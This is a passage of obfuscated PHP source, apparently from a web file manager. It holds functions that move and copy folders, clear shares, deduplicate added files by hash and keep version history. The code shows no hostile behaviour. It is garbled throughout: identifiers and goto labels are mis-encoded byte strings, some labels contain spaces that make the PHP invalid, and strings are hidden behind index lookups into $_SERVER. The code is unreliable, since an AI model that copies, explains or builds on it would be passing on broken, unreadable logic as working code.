B¥Ç¯Í∑ªŒ: $this->updateModifyTime($a“ŸŒûîÙÊ); Model($d™É∏∏ˆÑÃ[505])->eventMove($bü‹≥≠‚ç«, $BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[461]], $f◊„“©Ó£¯); Hook::trigger($d™É∏∏ˆÑÃ[532], $B…£ô√—É⁄); goto CÆ◊†âÇÊ∆; CÒÉ¡–£ë¿: $this->folderSizeReset($f◊„“©Ó£¯); $a“ŸŒûîÙÊ = array($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[461]], $f◊„“©Ó£¯); if ($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[370]] == $d™É∏∏ˆÑÃ[83]) { $a“ŸŒûîÙÊ[] = $bü‹≥≠‚ç«; } goto B¥Ç¯Í∑ªŒ; C’úí‚¢Çƒ: $this->lockMoveEnd($bü‹≥≠‚ç«); $this->lockWriteEnd($f◊„“©Ó£¯, $cõ¯…”Ö ”); $this->folderSizeReset($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[461]]); goto CÒÉ¡–£ë¿; BôíΩº∑¯˘: if ($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[461]] == $Cêπ€ò∆Ù„[$d™É∏∏ˆÑÃ[369]]) { if ($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[397]] == $d™É∏∏ˆÑÃ[83]) { Model($d™É∏∏ˆÑÃ[395])->restore(array($bü‹≥≠‚ç«)); } return $bü‹≥≠‚ç«; } $B…£ô√—É⁄ = $this->pathInfoMore($bü‹≥≠‚ç«); if ($this->isParentOf($bü‹≥≠‚ç«, $f◊„“©Ó£¯)) { return !1; } goto eÛó¯É¨ÏÓ; Cì†Æ‰Ÿ⁄è: $C”Ñ◊≤Ω‘ = $this->fileNameExistCache($f◊„“©Ó£¯, $BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[28]]); $C—™Ø¥Çﬁ∞ = $this->_move($bü‹≥≠‚ç«, $f◊„“©Ó£¯, $FÊÃ∑ÖõÑ, $c‰ÂØÚÎìΩ, $F≥ù≤€ºˆØ); $this->sourceCacheClear(); goto AêÀäãªò√; F›ÇØßê‹Ø: if ($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[461]] == $f◊„“©Ó£¯ && $F≥ù≤€ºˆØ != $BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[28]]) { $B›ûüŒîŒÚ = $this->fileNameExist($f◊„“©Ó£¯, $F≥ù≤€ºˆØ); if ($B›ûüŒîŒÚ && $BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[370]] == $d™É∏∏ˆÑÃ[468]) { goto eß¬‡Éç Ò; CÑ‰—å»—ü: return $B›ûüŒîŒÚ; goto cªë„í´Õ”; eß¬‡Éç Ò: $AƒçâΩ∏Â¿ = $this->sourceInfo($B›ûüŒîŒÚ); $Eó¥˜Èê›Ï = $this->fileHistory($AƒçâΩ∏Â¿, $BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[419]], $BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[77]]); if (!$Eó¥˜Èê›Ï) { Model($d™É∏∏ˆÑÃ[422])->remove($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[419]]); } goto eõ˜â™›œë; eõ˜â™›œë: $this->removeNow($bü‹≥≠‚ç«, !1); $this->folderSizeReset($f◊„“©Ó£¯); Hook::trigger($d™É∏∏ˆÑÃ[532], $B…£ô√—É⁄); goto CÑ‰—å»—ü; cªë„í´Õ”: } } $cõ¯…”Ö ” = $F≥ù≤€ºˆØ ? $F≥ù≤€ºˆØ : $BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[28]]; $this->lockMoveStart($bü‹≥≠‚ç«); goto c‡’éàÙÉ; eÛó¯É¨ÏÓ: if (!$BÆœá›ﬂ∑É || !$Cêπ€ò∆Ù„ || $Cêπ€ò∆Ù„[$d™É∏∏ˆÑÃ[370]] != $d™É∏∏ˆÑÃ[83]) { return !1; } Hook::trigger($d™É∏∏ˆÑÃ[531], $B…£ô√—É⁄); $this->targetIsDelete = intval($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[397]]); goto F›ÇØßê‹Ø; B£›µ„–Ã∞: $d™É∏∏ˆÑÃ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $BÆœá›ﬂ∑É = $this->sourceInfo($bü‹≥≠‚ç«); $Cêπ€ò∆Ù„ = $this->sourceInfo($f◊„“©Ó£¯); goto BôíΩº∑¯˘; c‡’éàÙÉ: $this->lockWriteStart($f◊„“©Ó£¯, $cõ¯…”Ö ”); $c‰ÂØÚÎìΩ = array($d™É∏∏ˆÑÃ[501] => array(), $d™É∏∏ˆÑÃ[533] => !1); $this->clearShare($bü‹≥≠‚ç«, $f◊„“©Ó£¯); goto Cì†Æ‰Ÿ⁄è; CÆ◊†âÇÊ∆: return $C—™Ø¥Çﬁ∞; goto aì¨·›’ß´; AêÀäãªò√: if ($BÆœá›ﬂ∑É[$d™É∏∏ˆÑÃ[370]] == $d™É∏∏ˆÑÃ[83] && $C”Ñ◊≤Ω‘) { $this->folderSizeResetChildren($C—™Ø¥Çﬁ∞); } Model($d™É∏∏ˆÑÃ[167])->linkAdd($c‰ÂØÚÎìΩ[$d™É∏∏ˆÑÃ[501]]); if ($C”Ñ◊≤Ω‘ && $c‰ÂØÚÎìΩ[$d™É∏∏ˆÑÃ[533]]) { $this->removeNow($bü‹≥≠‚ç«, !1); } goto C’úí‚¢Çƒ; aì¨·›’ß´: } private function _move($dù§á‰Ö≥’, $aœîÏ›€úà, $b´‘⁄Ãß∏ë, &$a¬•É¬ü´ä, $CªËå—£…µ = '') { goto dü´Ò⁄¢°√; bﬂ˘ïÉ—íŸ: return $B‚πõ∑†„£; goto AÖﬂÍ©≥ç©; CÂ©øß…∂ÿ: $bÒß√∆à‚Ÿ = $CªËå—£…µ ? $CªËå—£…µ : $b†˜Ê±ã§ı[$EﬂÚóÓ°Ñº[28]]; $F◊âçÖèŒƒ = $this->fileNameExistCache($aœîÏ›€úà, $bÒß√∆à‚Ÿ); $this->lockMoveStart($dù§á‰Ö≥’); goto EÖª∆ÊñÒ∏; bÊê“€ÓõÕ: $F‹Æÿ·Ñ¢– = !1; if ($d¡–ó·£Â◊) { if ($b´‘⁄Ãß∏ë == REPEAT_RENAME_FOLDER) { $bÒß√∆à‚Ÿ = $this->fileNameAuto($aœîÏ›€úà, $bÒß√∆à‚Ÿ, $b´‘⁄Ãß∏ë, $d¡–ó·£Â◊); $B‚πõ∑†„£ = $this->_moveForce($dù§á‰Ö≥’, $aœîÏ›€úà, $bÒß√∆à‚Ÿ); } else { if ($b´‘⁄Ãß∏ë == REPEAT_RENAME_FOLDER) { $b´‘⁄Ãß∏ë = REPEAT_RENAME; } $d¨æ´ªöŒí = $this->_childrenListSelect($dù§á‰Ö≥’); foreach ($d¨æ´ªöŒí as $bπÜãÖŸƒ∞) { $this->_move($bπÜãÖŸƒ∞[$EﬂÚóÓ°Ñº[369]], $F◊âçÖèŒƒ, $b´‘⁄Ãß∏ë, $a¬•É¬ü´ä); } $F‹Æÿ·Ñ¢– = !0; } } else { if ($b´‘⁄Ãß∏ë == REPEAT_SKIP) { $F‹Æÿ·Ñ¢– = !0; } else { if ($b´‘⁄Ãß∏ë == REPEAT_RENAME || $b´‘⁄Ãß∏ë == REPEAT_RENAME_FOLDER) { $bÒß√∆à‚Ÿ = $this->fileNameAuto($aœîÏ›€úà, $bÒß√∆à‚Ÿ, $b´‘⁄Ãß∏ë, $d¡–ó·£Â◊); $B‚πõ∑†„£ = $this->_moveForce($dù§á‰Ö≥’, $aœîÏ›€úà, $bÒß√∆à‚Ÿ); } else { if ($b´‘⁄Ãß∏ë == REPEAT_REPLACE) { $c«ƒë©‚’î = $this->sourceInfoCache($F◊âçÖèŒƒ); $eö‘˘ª„îÑ = $this->fileHistory($c«ƒë©‚’î, $b†˜Ê±ã§ı[$EﬂÚóÓ°Ñº[419]], $b†˜Ê±ã§ı[$EﬂÚóÓ°Ñº[77]]); if ($eö‘˘ª„îÑ) { $a¬•É¬ü´ä[$EﬂÚóÓ°Ñº[501]][] = $b†˜Ê±ã§ı[$EﬂÚóÓ°Ñº[419]]; } else { $F‹Æÿ·Ñ¢– = !0; } } } } } if ($F‹Æÿ·Ñ¢– && !$a¬•É¬ü´ä[$EﬂÚóÓ°Ñº[533]]) { $a¬•É¬ü´ä[$EﬂÚóÓ°Ñº[533]] = !0; } goto bﬂ˘ïÉ—íŸ; dü´Ò⁄¢°√: $EﬂÚóÓ°Ñº =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $b†˜Ê±ã§ı = $this->sourceInfo($dù§á‰Ö≥’); $d¡–ó·£Â◊ = $b†˜Ê±ã§ı[$EﬂÚóÓ°Ñº[370]] == $EﬂÚóÓ°Ñº[83]; goto CÂ©øß…∂ÿ; EÖª∆ÊñÒ∏: $this->lockWriteStart($aœîÏ›€úà, $bÒß√∆à‚Ÿ); if (!$F◊âçÖèŒƒ) { return $this->_moveForce($dù§á‰Ö≥’, $aœîÏ›€úà, $bÒß√∆à‚Ÿ); } $B‚πõ∑†„£ = $F◊âçÖèŒƒ; goto bÊê“€ÓõÕ; AÖﬂÍ©≥ç©: } private function _moveForce($e∞ˆª∂¥≠€, $c¬Œò‰Ù€Ÿ, $eÿÈƒêÍÁ¢) { goto D§∫Ìçìø÷; då›πªƒπı: $CÕŸùãí‰ã = $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[370]] == $A‰ÇÜáîáÀ[83]; $B¨à˘ÒºÜü = array($A‰ÇÜáîáÀ[368] => $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[369]], $A‰ÇÜáîáÀ[525] => $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[459]] . $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[369]] . $A‰ÇÜáîáÀ[47], $A‰ÇÜáîáÀ[521] => $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[371]], $A‰ÇÜáîáÀ[522] => $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[456]], $A‰ÇÜáîáÀ[524] => USER_ID, $A‰ÇÜáîáÀ[386] => $eÿÈƒêÍÁ¢); $a¶∏Æ†ﬁ≈“ = $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[371]] == SourceModel::TYPE_GROUP && $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[371]] == SourceModel::TYPE_GROUP && $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[456]] == $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[456]]; goto CÕÿòÙêﬂò; D§∫Ìçìø÷: $A‰ÇÜáîáÀ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c‰†©¥Ç„Í = $this->sourceInfo($e∞ˆª∂¥≠€); $c¨ÕÇª¥åœ = $this->sourceInfo($c¬Œò‰Ù€Ÿ); goto då›πªƒπı; CÕÿòÙêﬂò: if (!$a¶∏Æ†ﬁ≈“) { Model($A‰ÇÜáîáÀ[454])->authClear($e∞ˆª∂¥≠€); } $b∞ÑóÍóƒ¯ = $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[397]] == $A‰ÇÜáîáÀ[83] && $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[397]] != $A‰ÇÜáîáÀ[83]; if ($b∞ÑóÍóƒ¯) { $B¨à˘ÒºÜü[$A‰ÇÜáîáÀ[396]] = 0; } goto fæÌ‚†∞—Ö; fæÌ‚†∞—Ö: if ($CÕŸùãí‰ã) { $EÏ„£÷›àƒ = array($A‰ÇÜáîáÀ[525] => array($A‰ÇÜáîáÀ[483], $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[459]] . $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[369]] . $A‰ÇÜáîáÀ[484])); $cÔÃàñÑˆî = $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[459]] . $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[369]] . $A‰ÇÜáîáÀ[47]; $c’ß÷¡íËª = $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[459]] . $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[369]] . $A‰ÇÜáîáÀ[47] . $c‰†©¥Ç„Í[$A‰ÇÜáîáÀ[369]] . $A‰ÇÜáîáÀ[47]; $E¬Î»Ñ∞ÑØ = array($A‰ÇÜáîáÀ[525] => array($A‰ÇÜáîáÀ[534], "\x72\145\160\154\x61\143\x65\x28\160\141\x72\145\x6e\164\114\x65\x76\x65\x6c\x2c\x27{$cÔÃàñÑˆî}\x27\x2c\47{$c’ß÷¡íËª}\47\x29"), $A‰ÇÜáîáÀ[521] => $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[371]], $A‰ÇÜáîáÀ[522] => $c¨ÕÇª¥åœ[$A‰ÇÜáîáÀ[456]]); if ($b∞ÑóÍóƒ¯) { $E¬Î»Ñ∞ÑØ[$A‰ÇÜáîáÀ[396]] = 0; } $this->where($EÏ„£÷›àƒ)->data($E¬Î»Ñ∞ÑØ)->save(); } $this->where(array($A‰ÇÜáîáÀ[383] => $e∞ˆª∂¥≠€))->data($B¨à˘ÒºÜü)->save(); return $e∞ˆª∂¥≠€; goto fÒñ≠É´Ω†; fÒñ≠É´Ω†: } private function clearShare($Cû•√Àô†ﬁ, $bÔÛ„ƒ“ê¥) { goto EﬂÂÛ›ûÓ‹; CﬂË˜ßéﬂë: Model($C—◊©ÿ⁄ªß[536])->where($a‚∑Êø‹øı)->save(array($C—◊©ÿ⁄ªß[448] => 0)); Model($C—◊©ÿ⁄ªß[537])->where($a‚∑Êø‹øı)->delete(); goto e‹ÊßßƒÌ¶; D«πƒ¥≠∞–: if (!$bÇº¯‹ü®Æ) { return; } $a‚∑Êø‹øı = array($C—◊©ÿ⁄ªß[369] => array($C—◊©ÿ⁄ªß[7], $bÇº¯‹ü®Æ), $C—◊©ÿ⁄ªß[448] => 1); $eΩ‰ù‰Û‹⁄ = Model($C—◊©ÿ⁄ªß[536])->field($C—◊©ÿ⁄ªß[441])->where($a‚∑Êø‹øı)->select(); goto CîãÇ“ÏŸ¶; EﬂÂÛ›ûÓ‹: $C—◊©ÿ⁄ªß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Bç‘¥°™œÑ = $this->sourceInfo($Cû•√Àô†ﬁ); $D‡¥õÚˆÖ— = $this->sourceInfo($bÔÛ„ƒ“ê¥); goto E“ª…µ·îÍ; E“ª…µ·îÍ: if ($Bç‘¥°™œÑ[$C—◊©ÿ⁄ªß[456]] == $D‡¥õÚˆÖ—[$C—◊©ÿ⁄ªß[456]] && $Bç‘¥°™œÑ[$C—◊©ÿ⁄ªß[371]] == $C—◊©ÿ⁄ªß[535]) { return; } $a‚∑Êø‹øı = array($C—◊©ÿ⁄ªß[459] => array($C—◊©ÿ⁄ªß[483], $Bç‘¥°™œÑ[$C—◊©ÿ⁄ªß[459]] . $Cû•√Àô†ﬁ . $C—◊©ÿ⁄ªß[484])); $bÇº¯‹ü®Æ = $this->field($C—◊©ÿ⁄ªß[383])->where($a‚∑Êø‹øı)->getField($C—◊©ÿ⁄ªß[369], !0); goto D«πƒ¥≠∞–; CîãÇ“ÏŸ¶: if (!$eΩ‰ù‰Û‹⁄) { return; } $eΩ‰ù‰Û‹⁄ = array_to_keyvalue($eΩ‰ù‰Û‹⁄, $C—◊©ÿ⁄ªß[33], $C—◊©ÿ⁄ªß[441]); $a‚∑Êø‹øı = array($C—◊©ÿ⁄ªß[441] => array($C—◊©ÿ⁄ªß[7], $eΩ‰ù‰Û‹⁄)); goto CﬂË˜ßéﬂë; e‹ÊßßƒÌ¶: } public function copyFolderFromIO($Eç∆ ùéº∆, $f›ŸÀ¬©àË, $F‘⁄≥∑œ∫Ò, $d¥éíñ›À’, $D‘÷éå¯˘Ë, $A≈ç≥∏ª‘Í = false) { goto A≈∑·ëªËÿ; DøŒˆ¡ª˜Ó: $this->updateModifyTime($F‘⁄≥∑œ∫Ò); return $E”øÈñ¬ƒÏ; goto aööØ–É¢ﬁ; BÜÕÎé‰ñâ: $DÑ°≈Œ©™¯ = $this->fileNameExist($F‘⁄≥∑œ∫Ò, $e¬üŒÎÌıà); $E”øÈñ¬ƒÏ = $this->mkdir($F‘⁄≥∑œ∫Ò, $e¬üŒÎÌıà, $d¥éíñ›À’); if (!$DÑ°≈Œ©™¯ || $d¥éíñ›À’ == REPEAT_RENAME_FOLDER) { $d¥éíñ›À’ = !1; } goto Fªåﬂ€É¬È; A≈∑·ëªËÿ: $a—Ô´∑≈€Ü =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $c≈„â√Ï≠¬ = array($a—Ô´∑≈€Ü[502] => array(), $a—Ô´∑≈€Ü[503] => array(), $a—Ô´∑≈€Ü[501] => array(), $a—Ô´∑≈€Ü[538] => array()); $e¬üŒÎÌıà = $A≈ç≥∏ª‘Í ? $A≈ç≥∏ª‘Í : $Eç∆ ùéº∆->getPathName($Eç∆ ùéº∆->pathThis($f›ŸÀ¬©àË)); goto BÜÕÎé‰ñâ; Fªåﬂ€É¬È: if ($DÑ°≈Œ©™¯) { $this->_childrenAllMake($DÑ°≈Œ©™¯); } Hook::trigger($a—Ô´∑≈€Ü[539]); $this->_copyChildTo($Eç∆ ùéº∆, $f›ŸÀ¬©àË, $E”øÈñ¬ƒÏ, $d¥éíñ›À’, $c≈„â√Ï≠¬, $D‘÷éå¯˘Ë); goto A¥≠›Ø•´†; A¥≠›Ø•´†: Hook::trigger($a—Ô´∑≈€Ü[540]); if ($E”øÈñ¬ƒÏ) { $this->folderSizeResetChildren($E”øÈñ¬ƒÏ); } $this->_childrenListClear(); goto e–ëÈÕÉ∂©; e–ëÈÕÉ∂©: Model($a—Ô´∑≈€Ü[504])->addAll($c≈„â√Ï≠¬[$a—Ô´∑≈€Ü[502]], array(), !0); Model($a—Ô´∑≈€Ü[505])->eventCopy($E”øÈñ¬ƒÏ); $this->saveAll($c≈„â√Ï≠¬[$a—Ô´∑≈€Ü[503]]); goto CØ€¯˜ÔÏ∂; CØ€¯˜ÔÏ∂: Model($a—Ô´∑≈€Ü[422])->linkAdd($c≈„â√Ï≠¬[$a—Ô´∑≈€Ü[501]]); Model($a—Ô´∑≈€Ü[422])->remove($c≈„â√Ï≠¬[$a—Ô´∑≈€Ü[538]]); $this->folderSizeReset($F‘⁄≥∑œ∫Ò); goto DøŒˆ¡ª˜Ó; aööØ–É¢ﬁ: } private function _copyChildTo($f£Ô›Ñâéù, $f∞ÂöÑÖ£ä, $eëÍÏœÑ—, $eõØåÚàìË, &$B®º•ç◊≥â, $Dã Èã◊˘ì) { goto B£Ü≈¡Ö†ï; B„ºÀäóíŒ: foreach ($dŒ≠–âﬁﬂ¯ as &$cËèãΩﬁá) { goto D≈Ôî¨èù—; D≈Ôî¨èù—: if (isset($c≠Òö÷ØÀÒ[$cËèãΩﬁá[$EÇ≠—⁄Ñû¡[28]]])) { $cËèãΩﬁá = $c≠Òö÷ØÀÒ[$cËèãΩﬁá[$EÇ≠—⁄Ñû¡[28]]]; } $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[370]] = $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[29]] == $EÇ≠—⁄Ñû¡[76]; $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[372]] = _get($cËèãΩﬁá, $EÇ≠—⁄Ñû¡[160], $EÇ≠—⁄Ñû¡[33]); goto dä∆ÏÒ∏“á; dä∆ÏÒ∏“á: $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[77]] = _get($cËèãΩﬁá, $EÇ≠—⁄Ñû¡[77], 0); $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[419]] = _get($cËèãΩﬁá, $EÇ≠—⁄Ñû¡[419], 0); if (!isset($cËèãΩﬁá[$EÇ≠—⁄Ñû¡[541]]) && $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[419]]) { $B®º•ç◊≥â[$EÇ≠—⁄Ñû¡[538]][] = $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[419]]; } goto AÛò´ç“º´; AÛò´ç“º´: if ($eõØåÚàìË) { $A é“–úÒÃ = $this->fileNameExistCache($eëÍÏœÑ—, $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[28]]); if ($A é“–úÒÃ) { if ($cËèãΩﬁá[$EÇ≠—⁄Ñû¡[370]] || $eõØåÚàìË == REPEAT_SKIP) { continue; } if ($eõØåÚàìË == REPEAT_REPLACE) { $BÌ‰áß†ä◊ = $this->sourceInfoCache($A é“–úÒÃ); $BŒ·´ß∑†Æ = $this->fileHistory($BÌ‰áß†ä◊, $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[419]], $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[77]]); if ($BŒ·´ß∑†Æ) { $B®º•ç◊≥â[$EÇ≠—⁄Ñû¡[501]][] = $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[419]]; } continue; } else { if ($eõØåÚàìË == REPEAT_RENAME) { $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[28]] = $this->fileNameAutoCache($eëÍÏœÑ—, $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[28]], $eõØåÚàìË, !1); } } } } if (!$cËèãΩﬁá[$EÇ≠—⁄Ñû¡[370]] && $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[419]]) { $B®º•ç◊≥â[$EÇ≠—⁄Ñû¡[501]][] = $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[419]]; } $DßÃÖÒ•«–[] = $this->_makeItemData($cËèãΩﬁá, $bΩÛÈ“∞è∞, $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[28]]); goto aéŒ≈—ƒÖﬁ; aéŒ≈—ƒÖﬁ: } unset($cËèãΩﬁá); if (!empty($DßÃÖÒ•«–)) { $this->addAll($DßÃÖÒ•«–); } goto f»˘πà•íë; bô‘‡∏®“Ú: $dŒ≠–âﬁﬂ¯ = array_merge($EŒÙàÿÜƒˆ[$EÇ≠—⁄Ñû¡[73]], $EŒÙàÿÜƒˆ[$EÇ≠—⁄Ñû¡[74]]); $c≠Òö÷ØÀÒ = $this->_addFiles($f£Ô›Ñâéù, $EŒÙàÿÜƒˆ[$EÇ≠—⁄Ñû¡[73]], $Dã Èã◊˘ì); $DßÃÖÒ•«– = array(); goto B„ºÀäóíŒ; f»˘πà•íë: $AÊûﬂ∏ÿ‘É = $this->_childrenList($eëÍÏœÑ—); $AÊûﬂ∏ÿ‘É = array_to_keyvalue($AÊûﬂ∏ÿ‘É, $EÇ≠—⁄Ñû¡[28]); foreach ($dŒ≠–âﬁﬂ¯ as $cËèãΩﬁá) { $BÌ‰áß†ä◊ = $AÊûﬂ∏ÿ‘É[$cËèãΩﬁá[$EÇ≠—⁄Ñû¡[28]]]; $c⁄™üó˘¨¯ = $BÌ‰áß†ä◊[$EÇ≠—⁄Ñû¡[369]]; $this->_copyApplyMeta($BÌ‰áß†ä◊, $B®º•ç◊≥â); if ($cËèãΩﬁá[$EÇ≠—⁄Ñû¡[29]] == $EÇ≠—⁄Ñû¡[76]) { $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[75]] = $f£Ô›Ñâéù->getPathInner($cËèãΩﬁá[$EÇ≠—⁄Ñû¡[75]]); $this->_copyChildTo($f£Ô›Ñâéù, $cËèãΩﬁá[$EÇ≠—⁄Ñû¡[75]], $c⁄™üó˘¨¯, $eõØåÚàìË, $B®º•ç◊≥â, $Dã Èã◊˘ì); } } goto C®»Ûµ°¢Ö; B£Ü≈¡Ö†ï: $EÇ≠—⁄Ñû¡ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bΩÛÈ“∞è∞ = $this->sourceInfoCache($eëÍÏœÑ—); $EŒÙàÿÜƒˆ = $f£Ô›Ñâéù->listPath($f∞ÂöÑÖ£ä, !1, !0); goto bô‘‡∏®“Ú; C®»Ûµ°¢Ö: } private function _addFiles($bÙÌœôÕˆ , $d≈ΩºÎ–ø•, $Cÿ∆áöàÀ˘) { goto eıÍùïìûì; DÀá¨ó©∆‚: return $bﬁïó†öåœ; goto fçèÜ∑ä¯È; dæú¬ÙÁµ¯: foreach ($Côç™„†ôÜ as $BµêâÛ·ÀÜ) { if (!isset($dÉêƒÜ£îã[$BµêâÛ·ÀÜ[$D®€ûöø≈ı[163]]])) { continue; } $Aîªåù–ÉÙ =& $dÉêƒÜ£îã[$BµêâÛ·ÀÜ[$D®€ûöø≈ı[163]]]; foreach ($Aîªåù–ÉÙ as &$EéÓ‹ÓÊ§) { $EéÓ‹ÓÊ§[$D®€ûöø≈ı[419]] = $BµêâÛ·ÀÜ[$D®€ûöø≈ı[419]]; } unset($EéÓ‹ÓÊ§); } $bﬁïó†öåœ = array(); foreach ($d≈ΩºÎ–ø• as $aÛ◊÷• ù”) { $bﬁïó†öåœ[$aÛ◊÷• ù”[$D®€ûöø≈ı[28]]] = $aÛ◊÷• ù”; } goto DÀá¨ó©∆‚; EÚôàıΩíø: $Eèö∫¿Õ±° = array(); foreach ($d≈ΩºÎ–ø• as $CÌºâ®€Óœ) { if (isset($CÌºâ®€Óœ[$D®€ûöø≈ı[541]]) && $CÌºâ®€Óœ[$D®€ûöø≈ı[541]]) { continue; } $fÜπëÎÀëÉ = $bÙÌœôÕˆ ->getPathInner($CÌºâ®€Óœ[$D®€ûöø≈ı[75]]); $C†∂øÂ®œÂ = $c†÷•öà≈Ÿ->addFileMake($fÜπëÎÀëÉ, $CÌºâ®€Óœ[$D®€ûöø≈ı[77]], $CÌºâ®€Óœ[$D®€ûöø≈ı[164]], $CÌºâ®€Óœ[$D®€ûöø≈ı[163]], $CÌºâ®€Óœ[$D®€ûöø≈ı[28]], $Cÿ∆áöàÀ˘); $Eèö∫¿Õ±°[] = $C†∂øÂ®œÂ; } $c†÷•öà≈Ÿ->addAll($Eèö∫¿Õ±°); goto FÈáï∑¥—ã; eıÍùïìûì: $D®€ûöø≈ı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$d≈ΩºÎ–ø• || count($d≈ΩºÎ–ø•) == 0) { return array(); } $dÉêƒÜ£îã = array(); goto dâ—ŸŸòøÎ; D∏Ìûÿ–É›: $Côç™„†ôÜ = $c†÷•öà≈Ÿ->where($FÎäæ¡’èç)->select(); $Côç™„†ôÜ = $Côç™„†ôÜ ? $Côç™„†ôÜ : array(); foreach ($Côç™„†ôÜ as $BµêâÛ·ÀÜ) { if (!isset($dÉêƒÜ£îã[$BµêâÛ·ÀÜ[$D®€ûöø≈ı[163]]])) { continue; } $b§Âã‡åÇ” = $dÉêƒÜ£îã[$BµêâÛ·ÀÜ[$D®€ûöø≈ı[163]]]; foreach ($b§Âã‡åÇ” as &$EéÓ‹ÓÊ§) { $EéÓ‹ÓÊ§[$D®€ûöø≈ı[419]] = $BµêâÛ·ÀÜ[$D®€ûöø≈ı[419]]; $EéÓ‹ÓÊ§[$D®€ûöø≈ı[541]] = !0; } unset($EéÓ‹ÓÊ§); } goto EÚôàıΩíø; dâ—ŸŸòøÎ: foreach ($d≈ΩºÎ–ø• as &$EéÓ‹ÓÊ§) { goto D¶¨≥¬·ÖÙ; AÑ Ô¥¶«…: $EéÓ‹ÓÊ§[$D®€ûöø≈ı[163]] = $Bò’ÀÈ¡¥ê; Hook::trigger($D®€ûöø≈ı[543], $EéÓ‹ÓÊ§); $dÉêƒÜ£îã[$Bò’ÀÈ¡¥ê][] =& $EéÓ‹ÓÊ§; goto eíåˆ¿®ü; D¶¨≥¬·ÖÙ: Hook::trigger($D®€ûöø≈ı[542], $EéÓ‹ÓÊ§); $EéÓ‹ÓÊ§[$D®€ûöø≈ı[75]] = $bÙÌœôÕˆ ->getPathInner($EéÓ‹ÓÊ§[$D®€ûöø≈ı[75]]); $Fıı¬´∏≤€ = $bÙÌœôÕˆ ->hashSimple($EéÓ‹ÓÊ§[$D®€ûöø≈ı[75]]); goto CÊ∏˘Œ‹ç€; eíåˆ¿®ü: if (count($dÉêƒÜ£îã[$Bò’ÀÈ¡¥ê]) > 1) { $EéÓ‹ÓÊ§[$D®€ûöø≈ı[541]] = !0; } goto eøùÛ•µ›≈; CÊ∏˘Œ‹ç€: $Bò’ÀÈ¡¥ê = $bÙÌœôÕˆ ->hashMd5($EéÓ‹ÓÊ§[$D®€ûöø≈ı[75]]); if (strlen($Bò’ÀÈ¡¥ê) > 10 && !isset($dÉêƒÜ£îã[$Bò’ÀÈ¡¥ê])) { $dÉêƒÜ£îã[$Bò’ÀÈ¡¥ê] = array(); } $EéÓ‹ÓÊ§[$D®€ûöø≈ı[164]] = $Fıı¬´∏≤€; goto AÑ Ô¥¶«…; eøùÛ•µ›≈: } $FÎäæ¡’èç = array($D®€ûöø≈ı[163] => array($D®€ûöø≈ı[7], array_keys($dÉêƒÜ£îã))); $c†÷•öà≈Ÿ = Model($D®€ûöø≈ı[544]); goto D∏Ìûÿ–É›; FÈáï∑¥—ã: $FÎäæ¡’èç = array($D®€ûöø≈ı[163] => array($D®€ûöø≈ı[7], array_keys($dÉêƒÜ£îã))); $Côç™„†ôÜ = $c†÷•öà≈Ÿ->where($FÎäæ¡’èç)->select(); $Côç™„†ôÜ = $Côç™„†ôÜ ? $Côç™„†ôÜ : array(); goto dæú¬ÙÁµ¯; fçèÜ∑ä¯È: } } define($_SERVER[Ä¿¡‡öóµŸﬂ‡][545], $_SERVER[Ä¿¡‡öóµŸﬂ‡][546]); goto aºä„º˜Ê¥; A‘Û¢ì—§…: define($_SERVER[Ä¿¡‡öóµŸﬂ‡][230], 0); 